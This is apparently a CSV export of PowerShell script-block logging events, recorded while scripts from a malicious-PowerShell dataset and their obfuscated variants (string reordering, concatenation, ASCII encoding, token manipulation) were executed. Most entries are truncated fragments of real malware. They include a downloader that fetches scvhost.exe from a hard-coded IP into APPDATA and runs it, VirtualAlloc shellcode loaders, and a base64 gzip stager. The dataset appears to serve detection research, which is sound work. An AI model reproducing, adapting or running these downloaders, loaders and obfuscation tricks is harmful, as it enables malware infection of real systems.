"8/6/2026 9:42:34 AM","","520","function jhZ8rZG8 {
	Param ($jb2R1cdw, $zwfVQ)		
	$mZKnRiCld = ([AppDomain]::CurrentDomain.GetAssemblies() | Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].Equals('System.dll"
"8/6/2026 9:42:34 AM","","2696","function jhZ8rZG8 {
	Param ($jb2R1cdw, $zwfVQ)		
	$mZKnRiCld = ([AppDomain]::CurrentDomain.GetAssemblies() | Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].Equals('System.dll"
"8/6/2026 9:42:34 AM","","1968","$s=New-Object IO.MemoryStream(,[Convert]::FromBase64String('H4sIAK09CVgCA7VWa2/iOhD93JX2P0QrJBItJUDZtltppesQngUKpIQCi67cxElMTUwdh9fe/e93wqOl2nbVu9KNWmFnZuzxOWc88eLQkZSHyjQYXYpR9VL58fHDSQcLPFPU1PS+0Ms7"
"8/6/2026 9:42:33 AM","","9","$global:?"
"8/6/2026 9:42:33 AM","","2334","if([IntPtr]::Size -eq 4){$b='powershell.exe'}else{$b=$env:windir+'\syswow64\WindowsPowerShell\v1.0\powershell.exe'};$s=New-Object System.Diagnostics.ProcessStartInfo;$s.FileName=$b;$s.Arguments='-nop "
"8/6/2026 9:42:32 AM","C:\TA\project-ta\data_spliting\test_set_obf\String_Reordering\malicious\1125.ps1","3056","& ( $SHelLiD[1]+$sHeLLid[13]+'X')(((""{21}{5}{4}{18}{68}{48}{3}{45}{51}{14}{66}{1}{13}{40}{12}{9}{62}{34}{2}{59}{11}{8}{69}{54}{61}{27}{56}{49}{32}{63}{33}{23}{31}{52}{24}{64}{25}{26}{43}{37}{41}{72}{6"
"8/6/2026 9:42:27 AM","","9","$global:?"
"8/6/2026 9:42:27 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/6/2026 9:42:27 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/6/2026 9:42:27 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/6/2026 9:42:27 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/6/2026 9:42:27 AM","","80","{ $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].Equals('System.dll') }"
"8/6/2026 9:42:27 AM","","520","function jhZ8rZG8 {
	Param ($jb2R1cdw, $zwfVQ)		
	$mZKnRiCld = ([AppDomain]::CurrentDomain.GetAssemblies() | Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].Equals('System.dll"
"8/6/2026 9:42:27 AM","","2696","function jhZ8rZG8 {
	Param ($jb2R1cdw, $zwfVQ)		
	$mZKnRiCld = ([AppDomain]::CurrentDomain.GetAssemblies() | Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].Equals('System.dll"
"8/6/2026 9:42:26 AM","","1968","$s=New-Object IO.MemoryStream(,[Convert]::FromBase64String('H4sIAK09CVgCA7VWa2/iOhD93JX2P0QrJBItJUDZtltppesQngUKpIQCi67cxElMTUwdh9fe/e93wqOl2nbVu9KNWmFnZuzxOWc88eLQkZSHyjQYXYpR9VL58fHDSQcLPFPU1PS+0Ms7"
"8/6/2026 9:42:25 AM","","9","$global:?"
"8/6/2026 9:42:25 AM","","2334","if([IntPtr]::Size -eq 4){$b='powershell.exe'}else{$b=$env:windir+'\syswow64\WindowsPowerShell\v1.0\powershell.exe'};$s=New-Object System.Diagnostics.ProcessStartInfo;$s.FileName=$b;$s.Arguments='-nop "
"8/6/2026 9:42:25 AM","C:\TA\project-ta\data_spliting\test_set_obf\String_Concatenation\malicious\1125.ps1","2713"," &( $ENv:comSPEC[4,24,25]-jOiN'')( (('if([IntPtr]::Size -eq 4){Ddib=Xbspowershell.exeXbs}else{Ddib=Ddienv:windir+XbsSh5syswow64Sh5WindowsPowerShel'+'lSh5v1'+'.0Sh5powershell.exeXbs};Ddis=New-Object Sy"
"8/6/2026 9:42:20 AM","","9","$global:?"
"8/6/2026 9:42:20 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/6/2026 9:42:20 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/6/2026 9:42:20 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/6/2026 9:42:20 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/6/2026 9:42:19 AM","","80","{ $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].Equals('System.dll') }"
"8/6/2026 9:42:19 AM","","520","function jhZ8rZG8 {
	Param ($jb2R1cdw, $zwfVQ)		
	$mZKnRiCld = ([AppDomain]::CurrentDomain.GetAssemblies() | Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].Equals('System.dll"
"8/6/2026 9:42:19 AM","","2696","function jhZ8rZG8 {
	Param ($jb2R1cdw, $zwfVQ)		
	$mZKnRiCld = ([AppDomain]::CurrentDomain.GetAssemblies() | Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].Equals('System.dll"
"8/6/2026 9:42:19 AM","","1968","$s=New-Object IO.MemoryStream(,[Convert]::FromBase64String('H4sIAK09CVgCA7VWa2/iOhD93JX2P0QrJBItJUDZtltppesQngUKpIQCi67cxElMTUwdh9fe/e93wqOl2nbVu9KNWmFnZuzxOWc88eLQkZSHyjQYXYpR9VL58fHDSQcLPFPU1PS+0Ms7"
"8/6/2026 9:42:18 AM","","9","$global:?"
"8/6/2026 9:42:18 AM","","2334","if([IntPtr]::Size -eq 4){$b='powershell.exe'}else{$b=$env:windir+'\syswow64\WindowsPowerShell\v1.0\powershell.exe'};$s=New-Object System.Diagnostics.ProcessStartInfo;$s.FileName=$b;$s.Arguments='-nop "
"8/6/2026 9:42:17 AM","C:\TA\project-ta\data_spliting\test_set_obf\ASCII_Encoding\malicious\1125.ps1","22","{([INt] $_-As [Char])}"
"8/6/2026 9:42:17 AM","C:\TA\project-ta\data_spliting\test_set_obf\ASCII_Encoding\malicious\1125.ps1","8048",".( $SHellID[1]+$sHeLlid[13]+'x')( [STRINg]::jOIn( '', ('105_102a40a91&73g110g116a80N116,114I93&58a58-83_105a122g101-32a45_101e113_32g52e41N123,36e98N61&39D112-111D119I101e114a115I104I101D108_108a46N10"
"8/6/2026 9:42:12 AM","","9","$global:?"
"8/6/2026 9:42:12 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/6/2026 9:42:12 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/6/2026 9:42:12 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/6/2026 9:42:12 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/6/2026 9:42:12 AM","","80","{ $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].Equals('System.dll') }"
"8/6/2026 9:42:12 AM","","520","function jhZ8rZG8 {
	Param ($jb2R1cdw, $zwfVQ)		
	$mZKnRiCld = ([AppDomain]::CurrentDomain.GetAssemblies() | Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].Equals('System.dll"
"8/6/2026 9:42:12 AM","","2696","function jhZ8rZG8 {
	Param ($jb2R1cdw, $zwfVQ)		
	$mZKnRiCld = ([AppDomain]::CurrentDomain.GetAssemblies() | Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].Equals('System.dll"
"8/6/2026 9:42:11 AM","","1968","$s=New-Object IO.MemoryStream(,[Convert]::FromBase64String('H4sIAK09CVgCA7VWa2/iOhD93JX2P0QrJBItJUDZtltppesQngUKpIQCi67cxElMTUwdh9fe/e93wqOl2nbVu9KNWmFnZuzxOWc88eLQkZSHyjQYXYpR9VL58fHDSQcLPFPU1PS+0Ms7"
"8/6/2026 9:42:10 AM","","9","$global:?"
"8/6/2026 9:42:10 AM","C:\TA\project-ta\data_spliting\test_set\malicious\1125.ps1","2334","if([IntPtr]::Size -eq 4){$b='powershell.exe'}else{$b=$env:windir+'\syswow64\WindowsPowerShell\v1.0\powershell.exe'};$s=New-Object System.Diagnostics.ProcessStartInfo;$s.FileName=$b;$s.Arguments='-nop "
"8/6/2026 9:42:02 AM","C:\TA\project-ta\data_spliting\test_set_obf\Token_Manipulation\malicious\112.ps1","166","(New`-`ObJeCt System.Net.WebClient).DownloadFile('http://93.174.94.137/~karma/scvhost.exe',""$env:APPDATA\scvhost.exe"");S`Tart-P`ROC`eSs (""$env:APPDATA\scvhost.exe"")
"
"8/6/2026 9:41:54 AM","","159","(New-Object System.Net.WebClient).DownloadFile('http://93.174.94.137/~karma/scvhost.exe',""$env:APPDATA\scvhost.exe"");Start-Process (""$env:APPDATA\scvhost.exe"")"
"8/6/2026 9:41:54 AM","C:\TA\project-ta\data_spliting\test_set_obf\String_Reordering\malicious\112.ps1","725"," (((""{50}{41}{40}{6}{24}{2}{16}{49}{20}{35}{52}{25}{36}{18}{17}{11}{8}{7}{37}{29}{42}{13}{45}{15}{47}{3}{48}{10}{31}{26}{9}{30}{39}{21}{46}{43}{4}{12}{33}{0}{34}{27}{19}{14}{32}{5}{28}{44}{1}{38}{51}{"
"8/6/2026 9:41:46 AM","","159","(New-Object System.Net.WebClient).DownloadFile('http://93.174.94.137/~karma/scvhost.exe',""$env:APPDATA\scvhost.exe"");Start-Process (""$env:APPDATA\scvhost.exe"")"
"8/6/2026 9:41:46 AM","C:\TA\project-ta\data_spliting\test_set_obf\String_Concatenation\malicious\112.ps1","525","('('+'New-O'+'bj'+'ect Syste'+'m.N'+'et.We'+'bCl'+'ient).Do'+'wnl'+'oadFile(ewO'+'ht'+'tp://93'+'.17'+'4'+'.94'+'.13'+'7/~karm'+'a'+'/sc'+'vh'+'os'+'t'+'.exeewO,du'+'e'+'Hhden'+'v:'+'A'+'PPDATA9Sh'+'s"
"8/6/2026 9:41:38 AM","","159","(New-Object System.Net.WebClient).DownloadFile('http://93.174.94.137/~karma/scvhost.exe',""$env:APPDATA\scvhost.exe"");Start-Process (""$env:APPDATA\scvhost.exe"")"
"8/6/2026 9:41:38 AM","C:\TA\project-ta\data_spliting\test_set_obf\ASCII_Encoding\malicious\112.ps1","770","-JOIN[ChaR[]] (40 , 78 ,101 ,119 , 45, 79 ,98 , 106 , 101,99 , 116 ,32,83,121 , 115, 116,101,109 ,46, 78,101,116 ,46,87, 101 , 98,67,108 , 105,101, 110, 116 , 41, 46 ,68 ,111, 119,110 , 108 , 111, 97 "
"8/6/2026 9:41:30 AM","C:\TA\project-ta\data_spliting\test_set\malicious\112.ps1","159","(New-Object System.Net.WebClient).DownloadFile('http://93.174.94.137/~karma/scvhost.exe',""$env:APPDATA\scvhost.exe"");Start-Process (""$env:APPDATA\scvhost.exe"")"
"8/6/2026 9:41:22 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/6/2026 9:41:22 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/6/2026 9:41:22 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/6/2026 9:41:22 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/6/2026 9:41:22 AM","C:\TA\project-ta\data_spliting\test_set_obf\Token_Manipulation\malicious\1115.ps1","2237","$c = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPtr C"
"8/6/2026 9:41:14 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/6/2026 9:41:14 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/6/2026 9:41:14 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/6/2026 9:41:14 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/6/2026 9:41:14 AM","","2231","$c = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPtr C"
"8/6/2026 9:41:14 AM","C:\TA\project-ta\data_spliting\test_set_obf\String_Reordering\malicious\1115.ps1","2759"," . ( $pSHOME[4]+$pshoME[30]+'x') ((((""{30}{33}{46}{26}{44}{35}{20}{17}{13}{42}{21}{16}{19}{39}{34}{32}{36}{1}{27}{40}{18}{10}{15}{28}{22}{4}{43}{5}{29}{37}{45}{41}{25}{0}{14}{6}{24}{7}{23}{2}{3}{12}{8"
"8/6/2026 9:41:06 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/6/2026 9:41:06 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/6/2026 9:41:06 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/6/2026 9:41:06 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/6/2026 9:41:06 AM","","2231","$c = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPtr C"
"8/6/2026 9:41:06 AM","C:\TA\project-ta\data_spliting\test_set_obf\String_Concatenation\malicious\1115.ps1","2597","('gNZc = 8l'+'v[DllImport(EHDkernel32.dllEHD)]public static extern IntPtr VirtualAlloc(IntPtr l'+'pAddress, uint dwSize, uint'+' flAllocationType, uint flProte'+'ct);[DllImport(EHDkernel32.dllEHD)]pub"
"8/6/2026 9:40:58 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/6/2026 9:40:58 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/6/2026 9:40:58 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/6/2026 9:40:58 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/6/2026 9:40:58 AM","","2231","$c = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPtr C"
"8/6/2026 9:40:58 AM","C:\TA\project-ta\data_spliting\test_set_obf\ASCII_Encoding\malicious\1115.ps1","24","{([INt] $_ -as [ChaR]) }"
"8/6/2026 9:40:57 AM","C:\TA\project-ta\data_spliting\test_set_obf\ASCII_Encoding\malicious\1115.ps1","7666","( '36x99z32z61y32P39y91f68!108f108u73f109z112!111!114q116q40f34x107q101V114x110q101!108q51P50V46u100f108d108d34x41q93z112u117!98!108z105d99q32f115P116P97y116z105!99d32!101q120f116P101q114y110!32!73x11"
"8/6/2026 9:40:50 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/6/2026 9:40:50 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/6/2026 9:40:50 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/6/2026 9:40:50 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/6/2026 9:40:50 AM","C:\TA\project-ta\data_spliting\test_set\malicious\1115.ps1","2231","$c = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPtr C"
"8/6/2026 9:40:42 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/6/2026 9:40:42 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/6/2026 9:40:42 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/6/2026 9:40:42 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/6/2026 9:40:41 AM","C:\TA\project-ta\data_spliting\test_set_obf\Token_Manipulation\malicious\1113.ps1","2328","$c = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPtr C"
"8/6/2026 9:40:34 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/6/2026 9:40:34 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/6/2026 9:40:34 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/6/2026 9:40:34 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/6/2026 9:40:34 AM","","2321","$c = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPtr C"
"8/6/2026 9:40:33 AM","C:\TA\project-ta\data_spliting\test_set_obf\String_Reordering\malicious\1113.ps1","3078","& ( $shellId[1]+$shElliD[13]+'X') ( ((""{67}{21}{14}{63}{27}{37}{11}{13}{69}{43}{54}{71}{56}{5}{28}{15}{1}{36}{9}{39}{7}{35}{59}{65}{45}{68}{6}{52}{22}{23}{62}{26}{30}{12}{18}{17}{31}{49}{57}{33}{34}{2"
"8/6/2026 9:40:26 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/6/2026 9:40:26 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/6/2026 9:40:26 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/6/2026 9:40:26 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/6/2026 9:40:26 AM","","2321","$c = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPtr C"
"8/6/2026 9:40:25 AM","C:\TA\project-ta\data_spliting\test_set_obf\String_Concatenation\malicious\1113.ps1","2779"," & ((gv '*mDR*').NAME[3,11,2]-join'')(('Syvc = DzA[DllImp'+'ort(8Onkern'+'el32.dll8On)]public static '+'extern I'+'ntPtr VirtualAlloc(In'+'tPtr lp'+'Address, uint dwSize, uint flAllocatio'+'nType, uin"
"8/6/2026 9:40:18 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/6/2026 9:40:18 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/6/2026 9:40:18 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/6/2026 9:40:18 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/6/2026 9:40:18 AM","","2321","$c = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPtr C"
"8/6/2026 9:40:17 AM","C:\TA\project-ta\data_spliting\test_set_obf\ASCII_Encoding\malicious\1113.ps1","20","{ ( [chAr][inT] $_)}"
"8/6/2026 9:40:17 AM","C:\TA\project-ta\data_spliting\test_set_obf\ASCII_Encoding\malicious\1113.ps1","10226"," ( (36 ,99,32, 61, 32, 39, 91,68 , 108, 108,73,109 ,112, 111 , 114, 116 ,40 ,34, 107 ,101 , 114, 110, 101, 108 , 51 , 50 ,46,100 ,108 , 108,34, 41 , 93 , 112, 117 , 98, 108,105 ,99 , 32,115, 116, 97 ,"
"8/6/2026 9:40:10 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/6/2026 9:40:10 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/6/2026 9:40:10 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/6/2026 9:40:10 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/6/2026 9:40:09 AM","C:\TA\project-ta\data_spliting\test_set\malicious\1113.ps1","2321","$c = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPtr C"
"8/6/2026 9:40:02 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/6/2026 9:40:02 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/6/2026 9:40:02 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/6/2026 9:40:02 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/6/2026 9:40:01 AM","C:\TA\project-ta\data_spliting\test_set_obf\Token_Manipulation\malicious\1089.ps1","2237","$c = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPtr C"
"8/6/2026 9:39:54 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/6/2026 9:39:54 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/6/2026 9:39:54 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/6/2026 9:39:54 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/6/2026 9:39:53 AM","","2231","$c = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPtr C"
"8/6/2026 9:39:53 AM","C:\TA\project-ta\data_spliting\test_set_obf\String_Reordering\malicious\1089.ps1","2922"," ((""{32}{35}{58}{21}{23}{3}{40}{22}{56}{37}{49}{53}{60}{43}{8}{63}{64}{45}{4}{10}{29}{42}{62}{41}{14}{16}{47}{55}{38}{48}{57}{25}{52}{33}{7}{46}{51}{11}{26}{18}{12}{67}{30}{17}{2}{19}{9}{6}{0}{34}{5}{"
"8/6/2026 9:39:46 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/6/2026 9:39:46 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/6/2026 9:39:46 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/6/2026 9:39:46 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/6/2026 9:39:45 AM","","2231","$c = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPtr C"
"8/6/2026 9:39:45 AM","C:\TA\project-ta\data_spliting\test_set_obf\String_Concatenation\malicious\1089.ps1","2608"," & ( $enV:COMSPEC[4,15,25]-jOiN'') (('yWnc = XZ'+'w[DllImport(2Jtkernel3'+'2.dll2Jt)]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint fl'+'AllocationType, uint flProtect);["
"8/6/2026 9:39:38 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/6/2026 9:39:38 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/6/2026 9:39:38 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/6/2026 9:39:38 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/6/2026 9:39:37 AM","","2233"," $c = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPtr "
"8/6/2026 9:39:37 AM","C:\TA\project-ta\data_spliting\test_set_obf\ASCII_Encoding\malicious\1089.ps1","20","{ ( [CHAR][INT] $_)}"
"8/6/2026 9:39:37 AM","C:\TA\project-ta\data_spliting\test_set_obf\ASCII_Encoding\malicious\1089.ps1","7722",". ((gv '*MdR*').nAME[3,11,2]-joiN'')(""$( sEt-iteM 'varIabLE:OFs'  '') ""+ [strinG]('36U99:32M61;32:39U91M68;108{108U73;109!112M111:114{116M40M34I107k101;114{110;101{108<51:50k46U100!108k108<34:41!93d11"
"8/6/2026 9:39:29 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/6/2026 9:39:29 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/6/2026 9:39:29 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/6/2026 9:39:29 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/6/2026 9:39:29 AM","C:\TA\project-ta\data_spliting\test_set\malicious\1089.ps1","2231","$c = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPtr C"
"8/6/2026 9:39:22 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/6/2026 9:39:22 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/6/2026 9:39:22 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/6/2026 9:39:22 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/6/2026 9:39:21 AM","C:\TA\project-ta\data_spliting\test_set_obf\Token_Manipulation\malicious\1086.ps1","2453","$c = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPtr C"
"8/6/2026 9:39:14 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/6/2026 9:39:14 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/6/2026 9:39:13 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/6/2026 9:39:13 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/6/2026 9:39:13 AM","","2446","$c = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPtr C"
"8/6/2026 9:39:13 AM","C:\TA\project-ta\data_spliting\test_set_obf\String_Reordering\malicious\1086.ps1","3019","& ((VarIABle '*mDr*').nAME[3,11,2]-Join'') ( ((""{37}{45}{27}{42}{0}{21}{49}{43}{47}{39}{24}{26}{9}{44}{12}{23}{48}{14}{31}{28}{22}{38}{5}{15}{29}{34}{10}{40}{8}{36}{7}{50}{4}{33}{20}{1}{6}{30}{11}{25}"
"8/6/2026 9:39:05 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/6/2026 9:39:05 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/6/2026 9:39:05 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/6/2026 9:39:05 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/6/2026 9:39:05 AM","","2446","$c = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPtr C"
"8/6/2026 9:39:05 AM","C:\TA\project-ta\data_spliting\test_set_obf\String_Concatenation\malicious\1086.ps1","2836"," ('2Qmc = wHK[DllImp'+'ort(dN2kerne'+'l32.dlldN2)]public st'+'atic extern IntPtr VirtualA'+'ll'+'oc(IntPtr lpAddress, u'+'int dwSize, uint flAlloca'+'tionType, uint flProtect);[DllImport(dN2kernel32.d"
"8/6/2026 9:38:57 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/6/2026 9:38:57 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/6/2026 9:38:57 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/6/2026 9:38:57 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/6/2026 9:38:57 AM","","2446","$c = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPtr C"
"8/6/2026 9:38:57 AM","C:\TA\project-ta\data_spliting\test_set_obf\ASCII_Encoding\malicious\1086.ps1","20","{ ( [CHAR][INt] $_)}"
"8/6/2026 9:38:57 AM","C:\TA\project-ta\data_spliting\test_set_obf\ASCII_Encoding\malicious\1086.ps1","10689"," -joIN ( ( 36 , 99,32,61 , 32 ,39, 91 , 68, 108,108 , 73, 109 , 112, 111 ,114, 116,40, 34,107 ,101 ,114 , 110 ,101 ,108,51, 50 , 46, 100, 108 ,108 , 34, 41 , 93 ,112,117 , 98 ,108,105 , 99, 32 ,115 , "
"8/6/2026 9:38:49 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/6/2026 9:38:49 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/6/2026 9:38:49 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
